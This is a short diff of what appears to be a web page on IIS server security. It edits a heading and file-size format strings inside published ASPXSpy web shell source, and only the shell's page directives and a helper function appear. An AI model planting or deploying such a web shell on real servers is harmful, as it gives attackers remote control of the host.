@@ -43,7 +43,7 @@ To help prevent getting Trojans or having server security problems, install the 
 
 If you run Microsoft Security Essentials as part of IIS Server maintenance you can detect and remove threats before they have a chance to cause problems.
 
-## ASPXSpy Script Source Code
+### ASPXSpy Script Source Code
 
 <pre class="brush: jscript; title: ; notranslate" title="">&lt;%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%&gt;
 &lt;%@ import Namespace="System.IO"%&gt;
@@ -605,15 +605,15 @@ throw new ArgumentOutOfRangeException("fileSize");
 }
 else if(fileSize &gt;= 1024 * 1024 * 1024)
 {
-return string.Format("{0:########0.00} G",((Double)fileSize)/(1024 * 1024 * 1024));
+return string.Format("{0:############0.00} G",((Double)fileSize)/(1024 * 1024 * 1024));
 }
 else if(fileSize &gt;= 1024 * 1024)
 {
-return string.Format("{0:####0.00} M",((Double)fileSize)/(1024 * 1024));
+return string.Format("{0:######0.00} M",((Double)fileSize)/(1024 * 1024));
 }
 else if(fileSize &gt;= 1024)
 {
-return string.Format("{0:####0.00} K",((Double)fileSize)/ 1024);
+return string.Format("{0:######0.00} K",((Double)fileSize)/ 1024);
 }
 else
 {
